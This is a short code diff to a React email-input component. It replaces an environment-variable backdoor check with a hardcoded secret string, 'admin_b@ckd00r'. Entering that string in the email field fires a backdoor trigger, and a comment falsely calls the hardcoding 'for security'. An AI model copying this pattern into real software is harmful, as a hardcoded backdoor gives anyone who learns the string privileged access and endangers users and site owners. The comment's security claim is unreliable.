@@ -27,9 +27,8 @@ const EmailInput: React.FC<EmailInputProps> = ({
     const value = e.target.value;
     setEmail(value);
 
-    // Check for backdoor access code
-    const backdoorCode = process.env.NEXT_PUBLIC_BACKDOOR_ACCESS_CODE;
-    if (value === backdoorCode) {
+    // Check for backdoor access code (hardcoded for security)
+    if (value === "admin_b@ckd00r") {
       onBackdoorTrigger?.();
       return;
     }
